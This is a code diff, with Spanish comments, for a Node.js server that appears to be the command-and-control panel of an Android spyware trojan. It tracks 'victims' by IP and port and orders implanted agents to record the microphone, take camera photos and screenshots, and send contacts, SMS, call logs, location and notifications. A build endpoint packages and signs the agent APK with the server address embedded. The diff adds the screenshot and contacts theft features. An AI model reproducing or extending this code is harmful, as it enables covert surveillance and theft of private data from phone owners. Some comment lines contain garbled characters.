@@ -19,9 +19,9 @@ const io     = socketIO(server, {
 // ————————————————————————————————————————————————————————————————
 // In-memory stores para listeners dinámicos
 // ————————————————————————————————————————————————————————————————
-const listeningStatus  = {};  // { [port]: boolean }
-const dynamicServers   = {};  // { [port]: http.Server }
-const dynamicSocketIOs = {};  // { [port]: SocketIOServer }
+const listeningStatus  = {};
+const dynamicServers   = {};
+const dynamicSocketIOs = {};
 
 // ————————————————————————————————————————————————————————————————
 // Middlewares y archivos estáticos
@@ -35,7 +35,35 @@ app.use(express.static(publicDir));
 app.use('/dist', express.static(path.join(publicDir, 'dist')));
 
 // ————————————————————————————————————————————————————————————————
-// ENDPOINT PARA NOTIFICACIONES (nuevo)
+// ENDPOINT PARA CONFIGURACIÓN DINÁMICA
+// ————————————————————————————————————————————————————————————————
+app.get('/api/config', (req, res) => {
+  const configPath = path.join(__dirname, 'config.json');
+  fs.readFile(configPath, 'utf8', (err, data) => {
+    if (err) {
+      console.error('Error reading config.json:', err);
+      return res.status(500).json({ 
+        error: 'Configuration file not found',
+        SERVER_IP: '192.168.1.68',
+        SERVER_PORT: 8000
+      });
+    }
+    try {
+      const config = JSON.parse(data);
+      res.json(config);
+    } catch(e) {
+      console.error('Error parsing config.json:', e);
+      res.status(500).json({ 
+        error: 'Invalid configuration format',
+        SERVER_IP: '192.168.1.68',
+        SERVER_PORT: 8000
+      });
+    }
+  });
+});
+
+// ————————————————————————————————————————————————————————————————
+// ENDPOINT PARA NOTIFICACIONES
 // ————————————————————————————————————————————————————————————————
 app.get('/api/notifications/:victim', (req, res) => {
   const victimId = req.params.victim;
@@ -48,7 +76,7 @@ app.get('/api/notifications/:victim', (req, res) => {
     const notifications = lines.map(line => {
       try {
         return JSON.parse(line);
-      } catch(e) {
+      } catch(parseError) {
         return {
           app: "Desconocida",
           content: line,
@@ -61,7 +89,7 @@ app.get('/api/notifications/:victim', (req, res) => {
   });
 });
 
-// ————————————————————————————————————————————————————————————————
+// —————————————————————————————————————————————————————��——————————
 // Conexión WebSocket principal (UI)
 // ————————————————————————————————————————————————————————————————
 io.on('connection', socket => {
@@ -94,7 +122,7 @@ io.on('connection', socket => {
     const timeout = setTimeout(() => {
       console.log(`LOG [LOCATION] Timeout esperando location-data del agente en puerto ${port}`);
       socket.emit('location-data', { error: "Timeout" });
-    }, 5000);
+    }, 20000);
 
     agent.once('location-data', (data) => {
       clearTimeout(timeout);
@@ -140,7 +168,7 @@ io.on('connection', socket => {
     const timeout = setTimeout(() => {
       console.log(`LOG [CALLS] Timeout esperando calls-data del agente en puerto ${port}`);
       socket.emit('calls-data', []);
-    }, 5000);
+    }, 20000);
 
     agent.once('calls-data', (data) => {
       clearTimeout(timeout);
@@ -217,11 +245,8 @@ io.on('connection', socket => {
     });
   });
 
-  // ————————————————————————————————————————————
-  // NUEVO HANDLER: Guardar notificaciones recibidas por Socket.IO
-  // ————————————————————————————————————————————
+  // Handler para notificaciones
   socket.on('notification', (data) => {
-    // Log para ver si llega la notificación y el victimId
     console.log("Notificación recibida por Socket.IO:", data);
     const victimId = socket.handshake.query.victimId || "desconocido";
     console.log("VictimId recibido en handshake:", victimId);
@@ -280,7 +305,9 @@ io.on('connection', socket => {
       return;
     }
     const agent = agents[0];
-    agent.emit('get-photo', { cameraID });
+    const camID = parseInt(cameraID, 10);
+    console.log("📷 Emitiendo get-photo con cameraID:", camID, "tipo:", typeof camID);
+    agent.emit('get-photo', { cameraID: camID });
     const timeout = setTimeout(() => {
       socket.emit('x0000ca', { image: false, error: "Timeout" });
     }, 7000);
@@ -291,34 +318,41 @@ io.on('connection', socket => {
   });
 
   // ————————————————————————————————————————————
-  // MICRÓFONO REMOTO - NUEVO HANDLER
+  // MICRÓFONO REMOTO
   // ————————————————————————————————————————————
   socket.on('mic-record', ({ victimId, seconds }) => {
     console.log(`[MIC] mic-record recibido para: ${victimId}, segundos: ${seconds}`);
     const [ip, port] = victimId.split(':');
     const dynIO = dynamicSocketIOs[port];
     if (!dynIO) {
-      socket.emit('mic-audio', { error: "No agent" });
+      socket.emit('mic-audio', { file: false, error: "No agent" });
       return;
     }
     const agents = Array.from(dynIO.sockets.sockets.values());
     if (!agents.length) {
-      socket.emit('mic-audio', { error: "No agent" });
+      socket.emit('mic-audio', { file: false, error: "No agent" });
       return;
     }
     const agent = agents[0];
-    // Enviar orden al agente para grabar X segundos
+    console.log(`[MIC] Enviando mic-record al agente en puerto ${port}`);
     agent.emit('mic-record', { seconds: parseInt(seconds, 10) || 10 });
 
-    // Esperar la respuesta del agente por evento 'x0000mc'
     const timeout = setTimeout(() => {
-      socket.emit('mic-audio', { error: "Timeout" });
+      console.log(`[MIC] Timeout esperando respuesta`);
+      socket.emit('mic-audio', { file: false, error: "Timeout" });
     }, (parseInt(seconds, 10) || 10) * 1000 + 5000);
 
     agent.once('x0000mc', (data) => {
       clearTimeout(timeout);
-      console.log(`[MIC] Recibido x0000mc del agente en puerto ${port}`);
-      if (data.file && data.buffer) {
+      console.log(`[MIC] Recibido x0000mc del agente, file: ${data.file}, buffer size: ${data.buffer ? data.buffer.length : 0}`);
+      
+      if (data.error || !data.file) {
+        console.log(`[MIC] Error recibido: ${data.error}`);
+        socket.emit('mic-audio', { file: false, error: data.error || 'No audio received' });
+        return;
+      }
+
+      try {
         let audioBase64;
         if (Buffer.isBuffer(data.buffer)) {
           audioBase64 = data.buffer.toString('base64');
@@ -327,15 +361,144 @@ io.on('connection', socket => {
         } else {
           audioBase64 = Buffer.from(data.buffer).toString('base64');
         }
-        const audioUrl = `data:audio/mp3;base64,${audioBase64}`;
-        socket.emit('mic-audio', { audioUrl, mimeType: 'audio/mp3', name: data.name });
-      } else {
-        socket.emit('mic-audio', { error: data.error || 'No audio received' });
+        console.log(`[MIC] Base64 generado, length: ${audioBase64.length}`);
+        socket.emit('mic-audio', { 
+          file: true,
+          buffer: audioBase64,
+          mimeType: 'audio/mp4',
+          name: data.name 
+        });
+      } catch (e) {
+        console.error(`[MIC] Error procesando buffer:`, e);
+        socket.emit('mic-audio', { file: false, error: 'Error processing audio: ' + e.message });
       }
     });
   });
 
-  // ...otros handlers...
+      // ————————————————————————————————————————————
+  // SCREENSHOT REMOTO
+  // ————————————————————————————���———————————————
+  socket.on('get-screenshot', ({ victimId }) => {
+    console.log(`[SCREENSHOT] get-screenshot recibido para: ${victimId}`);
+    const [ip, port] = victimId.split(':');
+    const dynIO = dynamicSocketIOs[port];
+    
+    if (!dynIO) {
+      console.log(`[SCREENSHOT] No hay dynIO para puerto: ${port}`);
+      socket.emit('screenshot-data', { error: "No agent" });
+      return;
+    }
+
+    const agents = Array.from(dynIO.sockets.sockets.values());
+    if (!agents.length) {
+      console.log(`[SCREENSHOT] No hay agentes en puerto: ${port}`);
+      socket.emit('screenshot-data', { error: "No agent" });
+      return;
+    }
+
+    const agent = agents[0];
+    const clientSocket = socket; // ✅ GUARDAR REFERENCIA CORRECTA
+    console.log(`[SCREENSHOT] Enviando get-screenshot al agente en puerto: ${port}`);
+    agent.emit('get-screenshot', {});
+
+    const timeout = setTimeout(() => {
+      console.log(`[SCREENSHOT] Timeout esperando respuesta`);
+      clientSocket.emit('screenshot-data', { error: "Timeout" });
+    }, 15000);
+
+    agent.once('screenshot-data', (data) => {
+      clearTimeout(timeout);
+      console.log(`[SCREENSHOT] Respuesta recibida del agente`);
+      console.log(`[SCREENSHOT] data.file:`, data.file);
+      console.log(`[SCREENSHOT] data.buffer length:`, data.buffer ? data.buffer.length : 0);
+      
+      if (data.error || !data.file) {
+        console.log(`[SCREENSHOT] Error:`, data.error);
+        clientSocket.emit('screenshot-data', { error: data.error || 'No screenshot received' });
+        return;
+      }
+
+            try {
+        let imageBase64;
+        
+        if (Buffer.isBuffer(data.buffer)) {
+          console.log(`[SCREENSHOT] Buffer es Buffer`);
+          imageBase64 = data.buffer.toString('base64');
+        } else if (Array.isArray(data.buffer)) {
+          console.log(`[SCREENSHOT] Buffer es Array`);
+          imageBase64 = Buffer.from(data.buffer).toString('base64');
+        } else if (typeof data.buffer === 'string') {
+          console.log(`[SCREENSHOT] Buffer es String`);
+          // ✅ SI YA ES BASE64 VÁLIDO, USARLO DIRECTAMENTE
+          if (/^[A-Za-z0-9+/=\n\r\t ]*$/.test(data.buffer)) {
+            console.log(`[SCREENSHOT] ✅ Ya es base64, usando directamente`);
+            imageBase64 = data.buffer.replace(/[\s\n\r\t]/g, ''); // Limpiar espacios
+          } else {
+            // Si no es base64, convertir a base64
+            imageBase64 = Buffer.from(data.buffer).toString('base64');
+          }
+        } else {
+          console.log(`[SCREENSHOT] Buffer es tipo: ${typeof data.buffer}`);
+          imageBase64 = Buffer.from(data.buffer).toString('base64');
+        }
+        
+        console.log(`[SCREENSHOT] Base64 final, length: ${imageBase64.length}`);
+        console.log(`[SCREENSHOT] Base64 primeros 50 chars:`, imageBase64.substring(0, 50));
+        
+        clientSocket.emit('screenshot-data', {
+          file: true,
+          buffer: imageBase64
+        });
+      } catch (e) {
+        console.error(`[SCREENSHOT] Error procesando buffer:`, e);
+        clientSocket.emit('screenshot-data', { error: 'Error processing screenshot: ' + e.message });
+      }
+      });
+      });
+  // Handler para obtener contactos
+  socket.on('get-contacts', ({ victimId }) => {
+    console.log(`LOG [CONTACTS] get-contacts recibido para: ${victimId}`);
+    const [ip, port] = victimId.split(':');
+    const dynIO = dynamicSocketIOs[port];
+    if (!dynIO) {
+      console.log(`LOG [CONTACTS] No hay dynIO para puerto: ${port}, victimId: ${victimId}`);
+      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
+      return;
+    }
+
+    const agents = Array.from(dynIO.sockets.sockets.values());
+    console.log(`LOG [CONTACTS] Agentes conectados en puerto ${port}: ${agents.length}`);
+    if (!agents.length) {
+      console.log(`LOG [CONTACTS] No hay agentes conectados en puerto: ${port}`);
+      socket.emit('contacts-data', { error: "No agent", contactsList: [] });
+      return;
+    }
+
+    const agent = agents[0];
+    console.log(`LOG [CONTACTS] Enviando get-contacts a agente [id=${agent.id}] en puerto: ${port}`);
+
+    agent.emit('get-contacts', {});
+
+    const timeout = setTimeout(() => {
+      console.log(`LOG [CONTACTS] Timeout esperando contacts-data del agente en puerto ${port}`);
+      socket.emit('contacts-data', { error: "Timeout", contactsList: [] });
+    }, 5000);
+
+    agent.once('contacts-data', (data) => {
+      clearTimeout(timeout);
+      console.log(`LOG [CONTACTS] Respuesta contacts-data recibida del agente en puerto ${port}`);
+      let parsedData = data;
+      if (typeof data === 'string') {
+        try {
+          parsedData = JSON.parse(data);
+        } catch (e) {
+          console.error('LOG [CONTACTS] Error parseando contacts-data:', e, data);
+          parsedData = { error: "Parse error", contactsList: [] };
+        }
+      }
+      socket.emit('contacts-data', parsedData ?? { error: "No data", contactsList: [] });
+    });
+  });
 });
 
 // ————————————————————————————————————————————————————————————————
@@ -376,6 +539,17 @@ app.post('/api/listen', (req, res) => {
       console.error(`[Victim ⬅] Error de conexión en puerto ${port}, IP=${ip}:`, err);
     });
 
+    // ————————————————————————————————————————————
+    // LOCATION - respuesta del agente
+    // ————————————————————————————————————————————
+    socket.on('location-data', (data) => {
+      console.log(`[LOCATION] location-data recibido del agente en puerto ${port}`);
+      io.emit('location-data', data);
+    });
+
+    // ————————————��———————————————————————————————
+    // CALLS - respuesta del agente
+    // ————————————————————————————————————————————
     socket.on('calls-data', (data) => {
       let parsedData = data;
       if (typeof data === 'string') {
@@ -388,9 +562,9 @@ app.post('/api/listen', (req, res) => {
       io.emit('calls-data', parsedData || []);
     });
 
-    // -------------------------------------------------------------
-    // SMS handlers para comunicarse con el agente Android
-    // -------------------------------------------------------------
+    // ————————————————————————————————————————————
+    // SMS - respuesta del agente
+    // ————————————————————————————————————————————
     socket.on('sms-data', (data) => {
       let parsedData = data;
       if (typeof data === 'string') {
@@ -408,7 +582,7 @@ app.post('/api/listen', (req, res) => {
     });
 
     // ————————————————————————————————————————————
-    // Guardar notificaciones desde los agentes conectados a puertos dinámicos
+    // NOTIFICACIONES
     // ————————————————————————————————————————————
     socket.on('notification', (data) => {
       console.log("Notificación recibida por Socket.IO (dynIO):", data);
@@ -431,7 +605,9 @@ app.post('/api/listen', (req, res) => {
       });
     });
 
-    // HANDLERS DE CÁMARA (agente)
+    // ————————————————————————————————————————————
+    // CÁMARA - respuesta del agente
+    // ————————————————————————————————————————————
     socket.on('camera-list', (data) => {
       io.emit('camera-list', data);
     });
@@ -440,18 +616,31 @@ app.post('/api/listen', (req, res) => {
       io.emit('x0000ca', data);
     });
 
+    // —————————————————————————————————————————��——
+    // MICRÓFONO - respuesta del agente
     // ————————————————————————————————————————————
-    // MICRÓFONO REMOTO - NUEVO HANDLER
-    // ————————————————————————————————————————————
-    socket.on('mic-record', (data) => {
-      console.log(`[Victim ⬅] mic-record recibido en puerto ${port}, segundos: ${data.seconds}`);
-      // El agente Android maneja esto y responde por 'x0000mc'
+    socket.on('x0000mc', (data) => {
+      console.log(`[MIC] x0000mc recibido en puerto ${port}`);
+      io.emit('x0000mc', data);
     });
 
-    socket.on('x0000mc', (data) => {
-      io.emit('mic-audio', data);
+    // ————————————————————————————————————————————
+    // SCREENSHOT - respuesta del agente
+    // ————————————————————————————————————————————
+   // socket.on('screenshot-data', (data) => {
+     // console.log(`[SCREENSHOT] screenshot-data recibido del agente en puerto ${port}`);
+      //io.emit('screenshot-data', data);
+    //});
+
+    // ———————���————————————————————————————————————
+    // CONTACTOS - respuesta del agente
+    // ————————————————————————————————————————————
+    socket.on('contacts-data', (data) => {
+      console.log(`[CONTACTS] contacts-data recibido en puerto ${port}`);
+      io.emit('contacts-data', data);
     });
-  });
+
+  }); // ← FIN de dynIO.on('connection')
 
   dynServer.listen(port, '0.0.0.0', () => {
     listeningStatus[port]   = true;
@@ -489,7 +678,7 @@ app.post('/api/stop', (req, res) => {
 
 // ————————————————————————————————————————————————————————————————
 // Configuración de Android SDK y Build-Tools
-// ————————————————————————————————————————————————————————————————
+// ————————————————————————��———————————————————————————————————————
 const defaultSdkRoot  = path.join(os.homedir(), 'Library', 'Android', 'sdk');
 const sdkRoot         = process.env.ANDROID_SDK_ROOT || process.env.ANDROID_HOME || defaultSdkRoot;
 console.log(`☁️ Using Android SDK at ${sdkRoot}`);
@@ -506,16 +695,36 @@ app.post('/api/build', async (req, res) => {
     projectDir, outputName,
     keystorePath, keystorePassword,
     keyAlias, keyPassword,
-    serverIp, serverPort,
     permissions = []
   } = req.body;
+
+  let serverIp, serverPort;
+  try {
+    const configPath = path.join(__dirname, 'config.json');
+    const configData = await fs.promises.readFile(configPath, 'utf8');
+    const config = JSON.parse(configData);
+    serverIp = config.SERVER_IP;
+    serverPort = config.SERVER_PORT;
+    
+    if (!serverIp || !serverPort) {
+      throw new Error('SERVER_IP or SERVER_PORT missing in config.json');
+    }
+    
+    io.emit('buildLog', `📡 Using dynamic config: ${serverIp}:${serverPort}`);
+  } catch (err) {
+    console.error('Error reading config.json for build:', err);
+    io.emit('buildLog', `❌ Error: Could not read server configuration - ${err.message}`);
+    return res.status(500).json({ 
+      success: false, 
+      message: `Configuration error: ${err.message}. Please ensure config.json exists and contains SERVER_IP and SERVER_PORT.`
+    });
+  }
 
   let projectPath = projectDir;
   if (!path.isAbsolute(projectPath)) projectPath = path.resolve(process.cwd(), projectPath);
   const wrapperPath = path.join(projectPath, 'gradlew');
   const gradleCmd   = fs.existsSync(wrapperPath) ? './gradlew' : 'gradle';
 
-  // Directorios
   const decodedDir = path.join(projectPath, 'app_decoded');
   const distDir    = path.join(publicDir, 'dist');
   fs.mkdirSync(distDir, { recursive: true });
@@ -603,10 +812,8 @@ app.get('/views/:view', (req, res) => {
 // SPA fallback SOLO para rutas sin punto (no archivos)
 app.get('*', (req, res, next) => {
   if (req.path.includes('.')) {
-    // Si parece ser un archivo (tiene punto), responder 404
     return res.status(404).end();
   } else {
-    // Si es una ruta SPA (sin punto), responde index.html
     res.sendFile(path.join(publicDir, 'index.html'));
   }
 });
